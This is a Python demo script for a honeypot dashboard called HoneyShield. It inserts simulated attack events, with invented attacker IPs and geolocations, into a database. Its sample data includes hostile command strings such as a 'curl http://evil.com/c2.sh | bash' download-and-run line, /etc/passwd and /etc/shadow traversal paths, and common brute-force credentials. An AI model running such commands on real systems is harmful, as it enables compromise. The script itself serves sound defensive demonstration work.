"""
demo_simulation.py — HoneyShield Attack Simulator
==================================================
Generates realistic fake attack events directly into the SQLite database
so the dashboard shows live attack activity during presentations.

Usage:
    python demo_simulation.py              # Runs infinitely
    python demo_simulation.py --count 50   # Stop after 50 events
    python demo_simulation.py --fast       # No delay between events
    python demo_simulation.py --count 100 --fast
"""
import sys
import os
import io

# Fix Windows console encoding for emoji output
if sys.platform == "win32":
    sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8', errors='replace')
    sys.stderr = io.TextIOWrapper(sys.stderr.buffer, encoding='utf-8', errors='replace')

import random
import argparse
import signal
import time
from datetime import datetime, timedelta

# ── Path setup ────────────────────────────────────────────────────────────────
ROOT = os.path.dirname(os.path.abspath(__file__))
BACKEND = os.path.join(ROOT, "backend")
sys.path.insert(0, BACKEND)
sys.path.insert(0, ROOT)

# ── Monkey-patch GeoIP to avoid real API calls during demo ───────────────────
# We inject hardcoded geo data for our fake IPs before importing anything else
_GEO_CACHE: dict = {}

def _mock_resolve_ip(ip: str) -> dict:
    return _GEO_CACHE.get(ip, {
        "country": "Unknown", "countryCode": "XX",
        "regionName": "Unknown", "city": "Unknown",
        "lat": 0.0, "lon": 0.0, "as": "AS0 Unknown", "org": "Unknown"
    })

# Patch before core.geoip is imported
import importlib, types
geoip_mod = types.ModuleType("core.geoip")
geoip_mod.resolve_ip = _mock_resolve_ip
geoip_mod.resolve_batch = lambda ips: {ip: _mock_resolve_ip(ip) for ip in ips}
sys.modules["core.geoip"] = geoip_mod

# ── Now safe to import DB and logger ─────────────────────────────────────────
from core.database import init_db, get_session, AttackEvent, AttackerProfile
from sqlalchemy.orm import Session

# ── Attacker pool with realistic IPs & geo ───────────────────────────────────
ATTACKERS = [
    # China
    {"ip": "114.114.0.1",    "country": "China",          "country_code": "CN", "city": "Beijing",      "lat": 39.9042, "lon": 116.4074, "org": "ChinaNet"},
    {"ip": "1.180.22.134",   "country": "China",          "country_code": "CN", "city": "Shanghai",     "lat": 31.2304, "lon": 121.4737, "org": "CHINANET"},
    {"ip": "60.211.44.22",   "country": "China",          "country_code": "CN", "city": "Guangzhou",    "lat": 23.1291, "lon": 113.2644, "org": "ChinaTelecom"},
    # Russia
    {"ip": "91.210.145.22",  "country": "Russia",         "country_code": "RU", "city": "Moscow",       "lat": 55.7558, "lon": 37.6176, "org": "RuNet LLC"},
    {"ip": "188.166.23.45",  "country": "Russia",         "country_code": "RU", "city": "Saint Petersburg","lat": 59.9343, "lon": 30.3351, "org": "Rostelecom"},
    {"ip": "46.8.19.214",    "country": "Russia",         "country_code": "RU", "city": "Novosibirsk",  "lat": 55.0084, "lon": 82.9357, "org": "Beget LLC"},
    # USA
    {"ip": "204.14.12.99",   "country": "United States",  "country_code": "US", "city": "New York",     "lat": 40.7128, "lon": -74.0060, "org": "DigitalOcean"},
    {"ip": "35.188.44.100",  "country": "United States",  "country_code": "US", "city": "Los Angeles",  "lat": 34.0522, "lon": -118.2437,"org": "Google Cloud"},
    {"ip": "54.161.33.201",  "country": "United States",  "country_code": "US", "city": "Virginia",     "lat": 37.4316, "lon": -78.6569, "org": "Amazon AWS"},
    # Germany
    {"ip": "85.214.132.11",  "country": "Germany",        "country_code": "DE", "city": "Berlin",       "lat": 52.5200, "lon": 13.4050, "org": "Hetzner Online"},
    {"ip": "5.189.133.22",   "country": "Germany",        "country_code": "DE", "city": "Frankfurt",    "lat": 50.1109, "lon": 8.6821,  "org": "Contabo GmbH"},
    # Brazil
    {"ip": "177.34.22.11",   "country": "Brazil",         "country_code": "BR", "city": "São Paulo",    "lat": -23.5505,"lon": -46.6333,"org": "Claro NXT"},
    {"ip": "189.47.132.5",   "country": "Brazil",         "country_code": "BR", "city": "Rio de Janeiro","lat":-22.9068,"lon": -43.1729,"org": "Vivo"},
    # India
    {"ip": "103.45.67.89",   "country": "India",          "country_code": "IN", "city": "Mumbai",       "lat": 19.0760, "lon": 72.8777, "org": "Reliance Jio"},
    {"ip": "49.15.200.44",   "country": "India",          "country_code": "IN", "city": "Bengaluru",    "lat": 12.9716, "lon": 77.5946, "org": "Airtel"},
    # Netherlands
    {"ip": "194.109.21.33",  "country": "Netherlands",    "country_code": "NL", "city": "Amsterdam",    "lat": 52.3676, "lon": 4.9041,  "org": "LeaseWeb"},
    {"ip": "185.220.101.45", "country": "Netherlands",    "country_code": "NL", "city": "Rotterdam",    "lat": 51.9225, "lon": 4.4791,  "org": "NForce"},
    # Ukraine
    {"ip": "91.210.145.24",  "country": "Ukraine",        "country_code": "UA", "city": "Kyiv",         "lat": 50.4501, "lon": 30.5234, "org": "Ukrtelecom"},
    # South Korea
    {"ip": "121.78.22.11",   "country": "South Korea",    "country_code": "KR", "city": "Seoul",        "lat": 37.5665, "lon": 126.9780,"org": "KT Corp"},
    # Iran
    {"ip": "46.224.21.33",   "country": "Iran",           "country_code": "IR", "city": "Tehran",       "lat": 35.6892, "lon": 51.3890, "org": "IRNIC"},
    # Romania
    {"ip": "93.114.44.11",   "country": "Romania",        "country_code": "RO", "city": "Bucharest",    "lat": 44.4268, "lon": 26.1025, "org": "RCS & RDS"},
    # Vietnam
    {"ip": "14.161.33.22",   "country": "Vietnam",        "country_code": "VN", "city": "Hanoi",        "lat": 21.0285, "lon": 105.8542,"org": "VNPT"},
    # Pakistan
    {"ip": "111.68.100.33",  "country": "Pakistan",       "country_code": "PK", "city": "Karachi",      "lat": 24.8607, "lon": 67.0011, "org": "PTCL"},
    # Turkey
    {"ip": "31.142.77.25",   "country": "Turkey",         "country_code": "TR", "city": "Istanbul",     "lat": 41.0082, "lon": 28.9784, "org": "Turk Telekomunikasyon"},
    # Indonesia
    {"ip": "36.73.124.45",   "country": "Indonesia",      "country_code": "ID", "city": "Jakarta",      "lat": -6.2088, "lon": 106.8456,"org": "Telkom Indonesia"},
    # Bangladesh
    {"ip": "103.7.40.11",    "country": "Bangladesh",     "country_code": "BD", "city": "Dhaka",        "lat": 23.8103, "lon": 90.4125, "org": "Bangladesh Online"},
    # Nigeria
    {"ip": "197.210.44.22",  "country": "Nigeria",        "country_code": "NG", "city": "Lagos",        "lat": 6.5244,  "lon": 3.3792,  "org": "MTN Nigeria"},
    # Mexico
    {"ip": "148.244.100.33", "country": "Mexico",         "country_code": "MX", "city": "Mexico City",  "lat": 19.4326, "lon": -99.1332,"org": "Telmex"},
    # Argentina
    {"ip": "190.210.22.44",  "country": "Argentina",      "country_code": "AR", "city": "Buenos Aires", "lat": -34.6037,"lon": -58.3816,"org": "Telecom Argentina"},
    # France
    {"ip": "82.64.100.22",   "country": "France",         "country_code": "FR", "city": "Paris",        "lat": 48.8566, "lon": 2.3522,  "org": "Free SAS"},
]

# Pre-populate the GeoIP cache with our fake attackers
for a in ATTACKERS:
    _GEO_CACHE[a["ip"]] = {
        "country": a["country"], "countryCode": a["country_code"],
        "regionName": "", "city": a["city"],
        "lat": a["lat"], "lon": a["lon"],
        "as": f"AS{random.randint(1000,9999)} {a['org']}", "org": a["org"]
    }

# ── Attack scenarios ──────────────────────────────────────────────────────────
COMMON_USERNAMES = ["root", "admin", "test", "ubuntu", "oracle", "user", "pi", "postgres", "guest", "deploy"]
COMMON_PASSWORDS = ["123456", "password", "admin", "root", "test", "1234", "12345678", "qwerty", "abc123", "letmein",
                    "monkey", "master", "hello", "welcome", "shadow", "dragon", "pass", "password1", "football", "iloveyou"]
HTTP_PATHS = ["/wp-login.php", "/admin/", "/phpmyadmin/", "/.env", "/login", "/wp-admin/", "/config.php",
              "/../../../etc/passwd", "/shell.php", "/.git/config", "/api/v1/", "/manager/html"]
COMMANDS = ["whoami", "id", "uname -a", "cat /etc/passwd", "ls /", "wget http://evil.com/bot.sh",
            "curl http://evil.com/c2.sh | bash", "chmod +x /tmp/payload", "crontab -l", "ps aux"]

def _make_event(attacker: dict, service: str, attack_type: str, severity: str, **kwargs) -> dict:
    return {
        "source_ip":        attacker["ip"],
        "source_port":      random.randint(1024, 65535),
        "destination_port": {"ssh": 2222, "http": 8080, "ftp": 2121, "telnet": 2323}.get(service, 9999),
        "service":          service,
        "attack_type":      attack_type,
        "severity":         severity,
        "country":          attacker["country"],
        "country_code":     attacker["country_code"],
        "city":             attacker["city"],
        "region":           "",
        "latitude":         attacker["lat"],
        "longitude":        attacker["lon"],
        "asn":              f"AS{random.randint(1000,9999)}",
        "org":              attacker["org"],
        "ml_attack_type":   attack_type,
        "ml_confidence":    round(random.uniform(0.75, 0.99), 2),
        **kwargs,
    }

SCENARIO_GENERATORS = [
    # SSH brute force (most common)
    lambda a: _make_event(a, "ssh", "brute_force", "HIGH",
        username=random.choice(COMMON_USERNAMES),
        password=random.choice(COMMON_PASSWORDS)),
    lambda a: _make_event(a, "ssh", "brute_force", "HIGH",
        username="root", password=random.choice(COMMON_PASSWORDS)),
    # SSH command injection
    lambda a: _make_event(a, "ssh", "command_injection", "CRITICAL",
        username="root", password="toor",
        command=random.choice(COMMANDS)),
    # HTTP credential stuffing
    lambda a: _make_event(a, "http", "credential_stuffing", "MEDIUM",
        username="admin", password=random.choice(COMMON_PASSWORDS),
        http_method="POST", http_path=random.choice(["/wp-login.php", "/admin/"]),
        user_agent="Mozilla/5.0 (compatible; AttackBot/1.0)"),
    # HTTP directory traversal
    lambda a: _make_event(a, "http", "directory_traversal", "HIGH",
        http_method="GET", http_path=random.choice(["/../../../etc/passwd", "/../etc/shadow", "/.env", "/.git/config"]),
        user_agent="sqlmap/1.7.8"),
    # HTTP reconnaissance / scanning
    lambda a: _make_event(a, "http", "reconnaissance", "LOW",
        http_method="GET", http_path=random.choice(HTTP_PATHS),
        user_agent="Nikto/2.1.6"),
    # FTP malware delivery
    lambda a: _make_event(a, "ftp", "malware_delivery", "CRITICAL",
        username="anonymous", password="",
        command="STOR malware.exe",
        payload="<binary payload>"),
    # FTP brute force
    lambda a: _make_event(a, "ftp", "brute_force", "HIGH",
        username=random.choice(COMMON_USERNAMES),
        password=random.choice(COMMON_PASSWORDS)),
    # Telnet botnet probe (Mirai-style)
    lambda a: _make_event(a, "telnet", "botnet_probe", "CRITICAL",
        username=random.choice(["admin", "root", "supervisor", "guest"]),
        password=random.choice(["admin", "1234", "password", "root", "default"]),
        command="enable; system; /bin/busybox MIRAI"),
    lambda a: _make_event(a, "telnet", "botnet_probe", "HIGH",
        username="root", password="vizxv"),
]

# ── Main simulation loop ──────────────────────────────────────────────────────

keep_running = True

def _signal_handler(sig, frame):
    global keep_running
    print("\n\n  [!] Stopping simulation... Bye!")
    keep_running = False

def run_simulation(count: int, fast: bool, delay_range=(0.3, 2.0)):
    """Insert fake attack events directly into the SQLite DB."""
    global keep_running

    # Initialize DB
    init_db()
    db: Session = get_session()

    n = 0
    print(f"\n  🍯 HoneyShield Demo Simulation Starting")
    print(f"  Target: {'∞ events' if count == -1 else f'{count} events'} | Fast: {fast}\n")

    try:
        while keep_running and (count == -1 or n < count):
            attacker = random.choice(ATTACKERS)
            gen = random.choice(SCENARIO_GENERATORS)
            data = gen(attacker)

            event = AttackEvent(
                timestamp=datetime.utcnow(),
                **{k: v for k, v in data.items() if k != "timestamp"},
            )
            db.add(event)

            # Update attacker profile
            profile = db.query(AttackerProfile).filter_by(ip_address=attacker["ip"]).first()
            if not profile:
                profile = AttackerProfile(
                    ip_address=attacker["ip"],
                    first_seen=datetime.utcnow(),
                    country=attacker["country"],
                    country_code=attacker["country_code"],
                    city=attacker["city"],
                    latitude=attacker["lat"],
                    longitude=attacker["lon"],
                    org=attacker["org"],
                )
                db.add(profile)
            profile.last_seen = datetime.utcnow()
            profile.total_attempts = (profile.total_attempts or 0) + 1
            services = set((profile.services_hit or "").split(",")) - {""}
            services.add(data["service"])
            profile.services_hit = ",".join(sorted(services))
            sev_order = {"LOW":1,"MEDIUM":2,"HIGH":3,"CRITICAL":4}
            if sev_order.get(data["severity"],0) > sev_order.get(profile.max_severity or "LOW", 0):
                profile.max_severity = data["severity"]

            db.commit()
            n += 1

            flag_map = {"CN":"🇨🇳","RU":"🇷🇺","US":"🇺🇸","DE":"🇩🇪","BR":"🇧🇷","IN":"🇮🇳",
                        "NL":"🇳🇱","UA":"🇺🇦","KR":"🇰🇷","IR":"🇮🇷","TR":"🇹🇷","VN":"🇻🇳",
                        "PK":"🇵🇰","ID":"🇮🇩","BD":"🇧🇩","NG":"🇳🇬","MX":"🇲🇽","AR":"🇦🇷",
                        "FR":"🇫🇷","RO":"🇷🇴"}
            flag = flag_map.get(attacker["country_code"], "🌐")
            sev_color = {"CRITICAL":"\033[91m","HIGH":"\033[93m","MEDIUM":"\033[33m","LOW":"\033[92m"}
            reset = "\033[0m"
            sc = sev_color.get(data["severity"], "")
            print(f"  #{n:04d} {flag} {attacker['country']:<20} | "
                  f"{data['service'].upper():<7} | "
                  f"{sc}{data['attack_type']:<22}{reset} | "
                  f"{data['source_ip']:<18} | "
                  f"{sc}{data['severity']}{reset}")

            if not fast:
                time.sleep(random.uniform(*delay_range))

    except Exception as e:
        print(f"\n  [ERROR] {e}")
        import traceback; traceback.print_exc()
    finally:
        db.close()
        print(f"\n  ✅ Simulation complete. {n} events inserted into database.")
        print(f"  📊 View at: http://localhost:5000")


if __name__ == "__main__":
    signal.signal(signal.SIGINT, _signal_handler)
    parser = argparse.ArgumentParser(
        description="🍯 HoneyShield — Attack Demo Simulator",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python demo_simulation.py                  # Infinite attacks, 0.3-2s delay
  python demo_simulation.py --count 200      # 200 events then stop
  python demo_simulation.py --fast           # No delay (flood mode)
  python demo_simulation.py --count 100 --fast
        """
    )
    parser.add_argument("--count", type=int, default=-1, help="Number of events (default: infinite)")
    parser.add_argument("--fast", action="store_true", help="No delay between events")
    args = parser.parse_args()

    run_simulation(count=args.count, fast=args.fast)
